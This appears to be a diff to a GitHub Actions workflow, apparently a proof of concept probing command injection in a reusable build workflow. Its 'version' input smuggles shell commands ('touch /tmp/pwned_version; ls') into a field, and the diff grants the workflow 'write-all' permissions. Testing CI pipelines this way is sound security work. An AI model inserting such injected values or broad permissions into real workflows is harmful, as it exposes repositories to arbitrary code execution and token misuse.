@@ -1,6 +1,7 @@
 name: argus-call-3
 on:
   workflow_dispatch:
+permissions: write-all
 jobs:
   call:
     uses: ./.github/workflows/build-core.yml
@@ -8,4 +9,4 @@ jobs:
       version_type: "x"
       version: "x; touch /tmp/pwned_version; ls; exit 1; #"
       upstream_version: "x"
-      upstream_sha: ""
+      upstream_sha: "x"
